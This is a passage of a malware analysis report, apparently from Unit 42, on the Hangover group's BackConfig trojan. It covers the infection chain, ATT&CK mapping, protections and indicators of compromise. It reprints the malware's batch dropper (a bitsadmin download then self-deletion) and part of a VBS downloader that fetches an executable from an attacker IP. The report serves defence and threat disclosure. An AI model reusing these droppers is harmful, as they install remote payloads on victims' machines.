			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
echo off
bitsadmin /transfer Microsoft_Update /download /priority high 
http://185.203.119[.]184/winmgt/winmgt.exe 
%USERPROFILE%\Adobe\Driver\pdf\winmgt.exe
del %0</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928a008c21732473798-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c21732473798-2">2</div><div class="crayon-num" data-line="crayon-5f6928a008c21732473798-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c21732473798-4">4</div><div class="crayon-num" data-line="crayon-5f6928a008c21732473798-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c21732473798-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928a008c21732473798-1"><span class="crayon-e">echo </span><span class="crayon-e">off</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c21732473798-2"><span class="crayon-v">bitsadmin</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">transfer </span><span class="crayon-v">Microsoft_Update</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">download</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">priority </span><span class="crayon-e">high </span></div><div class="crayon-line" id="crayon-5f6928a008c21732473798-3"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//185.203.119[.]184/winmgt/winmgt.exe </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c21732473798-4"><span class="crayon-ta">%</span><span class="crayon-v">USERPROFILE</span><span class="crayon-o">%</span><span class="crayon-sy">\</span><span class="crayon-v">Adobe</span><span class="crayon-sy">\</span><span class="crayon-v">Driver</span><span class="crayon-sy">\</span><span class="crayon-v">pdf</span><span class="crayon-sy">\</span><span class="crayon-v">winmgt</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line" id="crayon-5f6928a008c21732473798-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c21732473798-6"><span class="crayon-v">del</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-cn">0</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p></p>
<h4>2020 Milestone: Fine Tuning</h4>
<p>The following execution flow diagram is based on one of the most recent weaponized documents Unit 42 has seen <span style="font-family: 'courier new', courier, monospace;">Invoice.xls</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c</span>; first seen <span style="font-family: 'courier new', courier, monospace;">2020-01-15</span>).</p>
<p>The infection process consists of multiple components as just described. The setup batch (BAT) file coordinates much of the infection process of the BackConfig plug-in loader once the VBA has written it to disk and executed it.</p>
<figure id="attachment_107198" aria-describedby="caption-attachment-107198" style="width: 600px" class="wp-caption aligncenter"><img class="wp-image-107198" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-67.png" alt="" width="600" height="749" /><figcaption id="caption-attachment-107198" class="wp-caption-text">Figure 6. Execution flow of BackConfig malware</figcaption></figure>
<p>The numbered bullet list below describes Figure 6.</p>
<ol>
<li style="list-style-type: none;">
<ol>
<li>Text file <span style="font-family: 'courier new', courier, monospace;">Drive.txt</span> (SHA-256: <span style="font-family: 'courier new', courier, monospace;">4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1</span>) is created and contains the decimal-decoded VBS content.</li>
<li>Similarly, the VBA code then writes batch code to another text file &#8211; <span style="font-family: 'courier new', courier, monospace;">Audio.txt</span>. The content of both files is shown in the appendix section of this report.</li>
<li><span style="font-family: 'courier new', courier, monospace;">Audio.txt</span> is renamed to <span style="font-family: 'courier new', courier, monospace;">Audio.bat</span> and executed.</li>
<li><span style="font-family: 'courier new', courier, monospace;">Audio.bat</span> cleans up any files and folders related to previous infections, and recreates the required environment including creating the aforementioned <span style="font-family: 'courier new', courier, monospace;">pid.txt</span> file, and setting various folders and files to be hidden from a default Windows Explorer view. The contents of <span style="font-family: 'courier new', courier, monospace;">pid.txt</span> is the victims computer name concatenated with a hyphen followed by a random number, although I believe the code used would not work as intended.</li>
<li><span style="font-family: 'courier new', courier, monospace;">Audio.bat</span> continues by creating two scheduled tasks referencing two files that are yet to exist: <span style="font-family: 'courier new', courier, monospace;">dphc.exe</span> will run every 10 minutes and Drive.vbs at 20 minute intervals.</li>
<li>Finally, before deleting itself, <span style="font-family: 'courier new', courier, monospace;">Audio.bat</span> will rename <span style="font-family: 'courier new', courier, monospace;">Drive.txt</span> to <span style="font-family: 'courier new', courier, monospace;">Drive.vbs</span>. When <span style="font-family: 'courier new', courier, monospace;">Drive.vbs</span> is eventually executed by the task scheduler, it will download the BackConfig executable payload. In the case of file <span style="font-family: 'courier new', courier, monospace;">8892279f3</span>&#8230; the remote location is <span style="font-family: 'courier new', courier, monospace;">http://185.203.119[.]184/Dropbox/request</span>.</li>
<li>When dphc.exe is eventually executed by the task scheduler, it first checks for the presence of pid.txt (step 4.) and only continues if the file exists.</li>
</ol>
</li>
</ol>
<p>Ultimately, the XLS writes two files to disk, one of which &#8212; the BAT &#8212; immediately modifies some system settings and creates two scheduled tasks. However, this behaviour may not be enough to determine the components as malicious. Only after 20 minutes will the task scheduler execute the VBS downloader component and launch the BackConfig loader EXE, by which time analysis systems may have stopped monitoring.</p>
<h4>ATT&amp;CK</h4>
<p>The following table describes the TTPs associated with the multiple campaigns described in this report.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 153.056px;"><strong><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Tactic</span></strong></td>
<td style="width: 713.056px;"><strong><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Technique (Mitre ATT&amp;CK ID)</span></strong></td>
</tr>
<tr>
<td style="width: 153.056px;" rowspan="2"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Technical Information Gathering</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Acquire OSINT data sets and information (T1247)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Conduct social engineering (T1249)</span></td>
</tr>
<tr>
<td style="width: 153.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Adversary Opsec</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Compromise 3rd party infrastructure to support delivery (T1312)</span></td>
</tr>
<tr>
<td style="width: 153.056px;" rowspan="2"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Build Capabilities</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Create custom payloads (T1345)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Obtain/re-use payloads (T1346)</span></td>
</tr>
<tr>
<td style="width: 153.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Stage Capabilities</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Upload, install, and configure software/tools (T1362)</span></td>
</tr>
<tr>
<td style="width: 153.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Initial Compromise</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Spear Phishing Link (T1192)</span></td>
</tr>
<tr>
<td style="width: 153.056px;" rowspan="2"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Execution</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">User Execution (T1204)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Exploitation for Client Execution (T1203)</span></td>
</tr>
<tr>
<td style="width: 153.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Execution, Persistence</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Scheduled Task (T1053)</span></td>
</tr>
<tr>
<td style="width: 153.056px;" rowspan="4"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Defense Evasion</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Code Signing (T1116)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Deobfuscate/Decode Files or Information (T1140)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Hidden Files and Directories (T1158)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Obfuscated Files or Information (T1027)</span></td>
</tr>
<tr>
<td style="width: 153.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Defense Evasion, Execution</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Scripting (T1064)</span></td>
</tr>
<tr>
<td style="width: 153.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Defense Evasion, Persistence</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">BITS Jobs (T1197)</span></td>
</tr>
<tr>
<td style="width: 153.056px;" rowspan="4"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Command &amp; Control</span></td>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Commonly Used Port (T1043)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Standard Application Layer Protocol (T1071)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Standard Cryptographic Protocol (T1032)</span></td>
</tr>
<tr>
<td style="width: 713.056px;"><span style="font-family: georgia, palatino, serif; font-size: 12pt;">Remote File Copy (T1105)</span></td>
</tr>
</tbody>
</table>
<h2>Conclusion</h2>
<p>The Hangover group (aka Neon, Viceroy Tiger, MONSOON) is active and targeting, according to Unit 42s visibility, government and military organisations in South Asia using spear-phishing emails containing letters or government forms to lure victims into browsing to compromised websites serving weaponized Excel documents that install the BackConfig Trojan. Almost exclusively, Unit 42 has seen the use of weaponized documents that require user execution. Only once in the last six months have we seen use of exploits to circumvent the need for the user to execute any part of the installation chain.</p>
<p>The evolution of BackConfigs primary and secondary payloads has seen different methods used for executing commands and deploying executables both with and without obfuscation.</p>
<p>The latest versions contain modular components making it easier to update and re-use code in order to rapidly deploy their campaigns in a timely manner to have the highest chance of success. The method in which the latest samples execute also indicates the groups focus on trying to evade sandbox and other automated analysis systems by breaking down malicious activity into chunks that each seem relatively benign.</p>
<p>Protections:</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 11.0227%;"><img class="wp-image-107200" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-68.png" width="66" height="54" /></td>
<td style="width: 88.2955%;">Cortex XDR protects endpoints from all malware, exploits and fileless attacks associated with Hangover actors.</td>
</tr>
<tr>
<td style="width: 11.0227%;"><img class="wp-image-107202" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-69.png" width="66" height="66" /></td>
<td style="width: 88.2955%;">WildFire cloud-based threat analysis service accurately identifies samples associated with these malware families.</td>
</tr>
<tr>
<td style="width: 11.0227%;"><img class="wp-image-107204" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-70.png" width="64" height="79" /></td>
<td style="width: 88.2955%;">Threat Prevention provides protection against the known client and server-side vulnerability exploits, malware, and command and control infrastructure used by these actors.</td>
</tr>
<tr>
<td style="width: 11.0227%;"><img class="wp-image-107206" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-71.png" width="66" height="85" /></td>
<td style="width: 88.2955%;">URL Filtering identifies all phishing and malware domains associated with these actors and proactively flags new infrastructure associated with these actors before it is weaponized.</td>
</tr>
<tr>
<td style="width: 11.0227%;"><img class="wp-image-107208" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/05/word-image-72.png" width="66" height="66" /></td>
<td style="width: 88.2955%;">Users of AutoFocus&#x2122; contextual threat intelligence service can view malware associated with these attacks using the following tags:</p>
<p>More information about the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Hangover">Hangover group</a> and the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.BackConfig">BackConfig malware</a> can be found in <a href="https://autofocus.paloaltonetworks.com">AutoFocus</a>.</td>
</tr>
</tbody>
</table>
<p>Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit <a href="http://www.cyberthreatalliance.org/">www.cyberthreatalliance.org</a>. <em>(This is added to blogs pre-shared with the CTA, when loaded into WordPress it will be added when appropriate).</em></p>
<h4>Indicators of Compromise</h4>
<h5><strong>Delivery Documents</strong></h5>
<p><span style="font-family: 'courier new', courier, monospace;">56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6</span><br />
<span style="font-family: 'courier new', courier, monospace;">8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c</span><br />
<span style="font-family: 'courier new', courier, monospace;">021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b</span><br />
<span style="font-family: 'courier new', courier, monospace;">be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461</span><br />
<span style="font-family: 'courier new', courier, monospace;">0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf</span><br />
<span style="font-family: 'courier new', courier, monospace;">ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb</span><br />
<span style="font-family: 'courier new', courier, monospace;">752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f <span style="font-family: georgia, palatino, serif;">(RTF using CVE-2017-11882)</span></span></p>
<h5><strong>Batch Files</strong></h5>
<p><span style="font-family: 'courier new', courier, monospace;">4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB <span style="font-family: georgia, palatino, serif;">(Audio.txt / .bat from Naya Housing campaign)</span></span><br />
<span style="font-family: 'courier new', courier, monospace;">C94f7733fc9bdbcb503efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9</span><br />
<span style="font-family: 'courier new', courier, monospace;">6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3</span><br />
<span style="font-family: 'courier new', courier, monospace;">750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580</span><br />
<span style="font-family: 'courier new', courier, monospace;">5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295</span><br />
<span style="font-family: 'courier new', courier, monospace;">f64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e</span><br />
<span style="font-family: 'courier new', courier, monospace;">98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e</span><br />
<span style="font-family: 'courier new', courier, monospace;">29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096 <span style="font-family: georgia, palatino, serif;">(driverkit.bat)</span></span><br />
<span style="font-family: 'courier new', courier, monospace;">abe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003 <span style="font-family: georgia, palatino, serif;">(Winmgt_Drive.bat uses bitsadmin)</span></span><br />
<span style="font-family: 'courier new', courier, monospace;">02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c</span></p>
<h5><strong>VBS files</strong></h5>
<p><span style="font-family: 'courier new', courier, monospace;">87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1 <span style="font-family: georgia, palatino, serif;">(One_drivers.txt / .vbs from Naya Housing campaign)</span></span><br />
<span style="font-family: 'courier new', courier, monospace;">952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a <span style="font-family: georgia, palatino, serif;">(Down_LinkLog.vbs)</span></span><br />
<span style="font-family: 'courier new', courier, monospace;">a1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb <span style="font-family: georgia, palatino, serif;">(Winmgt.vbs using BITS)</span></span></p>
<h5><strong>EXE Payloads</strong></h5>
<p><span style="font-family: 'courier new', courier, monospace;">306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644</span><br />
<span style="font-family: 'courier new', courier, monospace;">0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92</span><br />
<span style="font-family: 'courier new', courier, monospace;">84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c</span><br />
<span style="font-family: 'courier new', courier, monospace;">18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9</span><br />
<span style="font-family: 'courier new', courier, monospace;">922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709</span><br />
<span style="font-family: 'courier new', courier, monospace;">4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5</span><br />
<span style="font-family: 'courier new', courier, monospace;">677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2</span><br />
<span style="font-family: 'courier new', courier, monospace;">d3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f</span><br />
<span style="font-family: 'courier new', courier, monospace;">91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1</span><br />
<span style="font-family: 'courier new', courier, monospace;">de5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a</span><br />
<span style="font-family: 'courier new', courier, monospace;">f79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b</span><br />
<span style="font-family: 'courier new', courier, monospace;">9e141fe67521b75412419a8c88c199c8ebd2a135c7a8b58edced454fbc33cb77</span><br />
<span style="font-family: 'courier new', courier, monospace;">6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e</span><br />
<span style="font-family: 'courier new', courier, monospace;">e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f</span><br />
<span style="font-family: 'courier new', courier, monospace;">07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda</span><br />
<span style="font-family: 'courier new', courier, monospace;">31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848</span><br />
<span style="font-family: 'courier new', courier, monospace;">15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892</span><br />
<span style="font-family: 'courier new', courier, monospace;">D87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861</span><br />
<span style="font-family: 'courier new', courier, monospace;">167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e</span><br />
<span style="font-family: 'courier new', courier, monospace;">4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of older set of downloaders)</span><br />
<span style="font-family: 'courier new', courier, monospace;">b18697e999ed5859bfbc03e1d6e900752e1cdcd85ddb71729e2b38161366e5b5 <span style="font-family: georgia, palatino, serif;">(driverkit.zip)</span></span></p>
<h5><strong>Infrastructure</strong></h5>
<p><span style="font-family: 'courier new', courier, monospace;">linkrequest[.]live (23.106.123[.]87)</span><br />
<span style="font-family: 'courier new', courier, monospace;">matissues[.]com</span><br />
<span style="font-family: 'courier new', courier, monospace;">unique.fontsupdate[.]com</span><br />
<span style="font-family: 'courier new', courier, monospace;">185.203.119[.]184</span><br />
<span style="font-family: 'courier new', courier, monospace;">212.114.52[.]148</span></p>
<h5><strong>Digital Signatures</strong></h5>
<p>The following list of self-signed digital certificates is not exhaustive, and only relates to those seen on BackConfig PE executables samples over the past twelve months.</p>
<ul>
<li><strong>Foxit:</strong></li>
</ul>
<p><span style="font-family: 'courier new', courier, monospace;">thumbprint: 79635cb32cf16cf6bddfd563b09d7aa99ccb2c01</span><br />
<span style="font-family: 'courier new', courier, monospace;">issuer: CN=Foxit Software Incorporated</span><br />
<span style="font-family: 'courier new', courier, monospace;">subject: CN=Foxit Software Incorporated</span><br />
<span style="font-family: 'courier new', courier, monospace;">version: 3</span><br />
<span style="font-family: 'courier new', courier, monospace;">algorithm: sha1WithRSAEncryption</span><br />
<span style="font-family: 'courier new', courier, monospace;">serial: 50:53:ce:ad:42:c2:70:84:4f:55:bc:76:a4:23:6c:c8</span><br />
<span style="font-family: 'courier new', courier, monospace;">valid from: 1/1/2018</span><br />
<span style="font-family: 'courier new', courier, monospace;">valid to: 1/1/2024</span></p>
<ul>
<li><strong>Wind0ws:</strong></li>
</ul>
<p><span style="font-family: 'courier new', courier, monospace;">thumbprint: aa9010ff841c67cf8fb88d7f1e86a778b35bcba0</span><br />
<span style="font-family: 'courier new', courier, monospace;">issuer: CN=wind0ws</span><br />
<span style="font-family: 'courier new', courier, monospace;">subject: CN=wind0ws</span><br />
<span style="font-family: 'courier new', courier, monospace;">version: 3</span><br />
<span style="font-family: 'courier new', courier, monospace;">algorithm: sha1WithRSAEncryption</span><br />
<span style="font-family: 'courier new', courier, monospace;">serial: 88:de:2e:60:7f:48:2c:81:44:54:32:29:98:22:69:70</span><br />
<span style="font-family: 'courier new', courier, monospace;">valid from: 1/1/2019</span><br />
<span style="font-family: 'courier new', courier, monospace;">valid to: 1/1/2025</span></p>
<ul>
<li><strong>NVIDIA:</strong></li>
</ul>
<p><span style="font-family: 'courier new', courier, monospace;">thumbprint: 01ba433fdc7f9b1ad1baaea6c5fd69243d03d8c3</span><br />
<span style="font-family: 'courier new', courier, monospace;">issuer: CN=NVIDIA Corporation</span><br />
<span style="font-family: 'courier new', courier, monospace;">subject: CN=NVIDIA Corporation</span><br />
<span style="font-family: 'courier new', courier, monospace;">version: 3</span><br />
<span style="font-family: 'courier new', courier, monospace;">algorithm: sha1WithRSAEncryption</span><br />
<span style="font-family: 'courier new', courier, monospace;">serial: 6d:39:d4:59:15:9e:8c:b3:41:da:bd:4c:dd:37:60:e1</span><br />
<span style="font-family: 'courier new', courier, monospace;">valid from: 1/1/2019</span><br />
<span style="font-family: 'courier new', courier, monospace;">valid to: 1/1/2025</span></p>
<h1>Appendix</h1>
<p>The following VBS and BAT code was extracted from XLS sample (SHA-256: <span style="font-family: 'courier new', courier, monospace;">8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83</span>).</p>
<ul>
<li>VBS downloader component (SHA256: 4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1)</li>
</ul>
<p><span style="font-family: 'courier new', courier, monospace;">[Drive.txt -&gt; Drive.vbs CODE]</span></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928a008c3e507234507" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
strFileURL = "http://&lt;strong&gt;185.203.119[.]184/Dropbox/request"&lt;/strong&gt; 
Set oShell = CreateObject("WScript.Shell") 
     strHomeFolder = 
oShell.ExpandEnvironmentStrings("%USERPROFILE%") 
     strPath = "&lt;strong&gt;C:\Drivers\dphc.exe"&lt;/strong&gt; 
On Error Resume Next 
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") 
    objXMLHTTP.open "GET", strFileURL, false 
    objXMLHTTP.send() 
If objXMLHTTP.Status = 200 Then 
Set objADOStream = CreateObject("ADODB.Stream") 
objADOStream.Open 
objADOStream.Type = 1  
objADOStream.Write objXMLHTTP.ResponseBody 
objADOStream.Position = 0     
Set objFSO = CreateObject("Scripting.FileSystemObject") 
If objFSO.Fileexists(strPath) Then WScript.Quit() 
Set objFSO = Nothing 
objADOStream.SaveToFile strPath 
objADOStream.Close 
Set objADOStream = Nothing 
End if 
Set objXMLHTTP = Nothing  </textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-2">2</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-4">4</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-6">6</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-8">8</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-10">10</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-12">12</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-14">14</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-16">16</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-18">18</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-20">20</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c3e507234507-22">22</div><div class="crayon-num" data-line="crayon-5f6928a008c3e507234507-23">23</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928a008c3e507234507-1"><span class="crayon-v">strFileURL</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"http://&lt;strong&gt;185.203.119[.]184/Dropbox/request"</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-2"><span class="crayon-e">Set </span><span class="crayon-v">oShell</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"WScript.Shell"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">strHomeFolder</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-4"><span class="crayon-v">oShell</span><span class="crayon-sy">.</span><span class="crayon-e">ExpandEnvironmentStrings</span><span class="crayon-sy">(</span><span class="crayon-s">"%USERPROFILE%"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">strPath</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span 